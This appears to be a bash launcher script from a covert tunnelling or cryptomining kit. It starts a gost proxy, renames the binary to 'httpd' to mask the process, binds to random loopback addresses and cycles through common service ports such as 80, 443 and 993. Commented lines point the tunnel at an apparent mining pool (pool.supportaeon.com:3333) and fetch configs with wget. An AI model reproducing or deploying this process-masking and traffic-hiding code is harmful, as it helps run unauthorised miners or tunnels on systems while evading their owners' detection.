#!/bin/bash

## tnl starter
## TODO tstarter should support multiple listeners
## $1 is the starting port (for overrides)

trap "trap - SIGINT EXIT && kill -- -$$; cleanup" SIGINT EXIT

function update_tnl_cfg() {
    if [ -e "${TNL_CFG}" ]; then
        envsubst -no-empty -i ${TNL_CFG} -o ${TNL_CFG_MASK}
    else
        envsubst -no-empty -i cfg/${TNL_CFG} -o ${TNL_CFG_MASK}
    fi
}

function tstarter(){

    tnlpid(){
        pgrep -xf "${PGREP_TNL_MASK}"
    }

    portavl() {
        exec {socket}<>/dev/tcp/${TNL_LISTEN_ADDR1}/${TNL_LISTEN_PORT}
        avl=$?
        if [ $avl = 0 ]; then
            eval "exec ${socket}>&-"
            return 1 ## port already taken
        else
            printf "$1"
            return 0 ## nothing listening on port
        fi
    }
    checktnl() {
        local pid="$(tnlpid)"
        ## lsof or netstat require /proc so not reliable
        id_job tnl
        local tss=$job_n
        # local tss="$(jobs | grep ${TNL_MASK})"
        if [ -z "$pid" -o -n "$(portavl 1)" -o -z "$tss" ]; then ## order kind of matters
            return 1
        else
            return 0
        fi
    }
    starttnl(){
        ## starttnl should never be called more than once at a time
        if [ -n "$(tnlpid)" ]; then
            id_job tnl
            if [ -n "$job_n" ]; then
                # printf "%s" ${PREV_TNL_LISTEN} ## the previous port binded
                TNL_LISTEN_PORT=${PREV_TNL_LISTEN_PORT}
                return ## tnl started and already in session
            else ## a rogue tunnel not within its session kill it
                pkill -xf "${PREP_TNL_MASK}"
            fi
        fi
        eval "coproc tnl { dex_env; exec ${ESC_TNL_MASK} 2>/dev/null; }" ## exec command needs binary name escaped and unquoted
        fleep 1 ## time to bind
    }

    export TNL_LISTEN_PORT=$1
    gcpid=$(tnlpid)
    [ -n "$gcpid" ] && kill -9 $gcpid
    for port in $TNL_PLIST; do
        if portavl; then
            starttnl
        else
            checktnl && return 0 ## check again in case of late start
            PREV_TNL_LISTEN_PORT=$TNL_LISTEN_PORT
            export TNL_LISTEN_PORT=$port
            update_tnl_cfg
            continue
        fi
        if checktnl; then
            # printf "%s" ${TNL_LISTEN_PORT}
            return
        else
            PREV_TNL_LISTEN_PORT=$TNL_LISTEN_PORT
            export TNL_LISTEN_PORT=$port
            update_tnl_cfg
        fi
        fleep 2
    done

    return 1 ## no ports available
}



function setup_tnl() {
    [ -z "$TNL_LISTEN_ADDR" ] &&
        TNL_LISTEN_ADDR1=127.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%253+1))
    [ -z "$TNL_LISTEN_ADDR2" ] &&
        TNL_LISTEN_ADDR2=127.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%252+1))
    [ -z "$TNL_LISTEN_ADDR3" ] &&
        TNL_LISTEN_ADDR3=127.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%251+1))
    [ -z "$TNL_LISTEN_ADDRX" ] &&
        TNL_LISTEN_ADDRX=127.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%250+1))
    export TNL_LISTEN_ADDR1 TNL_LISTEN_ADDR2 TNL_LISTEN_ADDR3 TNL_LISTEN_ADDRX

    ## pluggable tunnel config folder
    [ -d net ] && mv net/* .
    TNL_CFG=${TNL_CFG:-gst.json.tpl}
    TNL_PATH=${TNL_PATH:-$(get_path gst)}
    # PC_PATH=${PC_PATH:-$(get_path pc)}
    TNL_MASK=${TNL_MASK:-httpd}
    TNL_CFG_MASK=${TNL_CFG_MASK:-gost.json}
    # PC_CFG=${PC_CFG:-pc.conf.tpl}
    # PC_CFG_MASK=${PC_CFG_MASK:-${PC_CFG%.tpl}}
    # TNL_ARGS=${TNL_ARGS:--C ${TNL_CFG_MASK}}

    # download cfg
    # if [ ! -e "cfg/${TNL_CFG}" ]; then
    #     wget -q "${CFG_BASE_URL}${TNL_CFG}" -O "cfg/${TNL_CFG}"
    # fi
    ## download pc
    # if [ ! -e "cfg/${PC_CFG}" ]; then
    #     wget -q "${CFG_BASE_URL}${PC_CFG}" -O "cfg/${PC_CFG}"
    # fi

    ## mask
    if [ -e "$TNL_PATH" ]; then
        mv "$TNL_PATH" "${TNL_MASK}" &&
            chmod +x "${TNL_MASK}"
    fi

    ## config with needed vars
    # if [ "$jail" -o -n "$(uname -r | grep -E ^2\.6\.[0-9]*\|^3\.1[0-9]*)" ]; then
    #     TNL_FORWARD_SCHEME=${TNL_FORWARD_SCHEME:-ss+mwss}
    # fi
    # [ "$lowhw" ]  &&
    #     TNL_LISTEN_TARGET=${TNL_LISTEN_TARGET:-pool.supportaeon.com:3333} ||
    #         TNL_LISTEN_TARGET=${TNL_LISTEN_TARGET:-${ENDPOINT}}

    # export TNL_LISTEN_TARGETX=${TNL_LISTEN_TARGETX:-127.0.0.1:18213} \
    #        TNL_LISTEN_SCHEME \
    #        TNL_LISTEN_TARGET \
    #        TNL_FORWARD_ADDR="$TNL_FORWARD_ADDR" \
    #        TNL_FORWARD_SCHEME \
    #        TNL_FORWARD_ADDR=${TNL_FORWARD_ADDR:-t.pkite.ga}
    export TNL_LISTEN_PORT=${TNL_LISTEN_PORT:-8080}
    update_tnl_cfg
    fleep 1

    TNL_PLIST="80 443 8081 8082 9000 10000 3036 20 21 465 993 995 110 123 2703 3036"
    tstarter ${TNL_LISTEN_PORT:-8080}  || exit 1 ## tstarter takes care of updating TNL_LISTEN for the pc config
    # envsubst -no-empty -i cfg/${PC_CFG} -o ${PC_CFG_MASK}
}
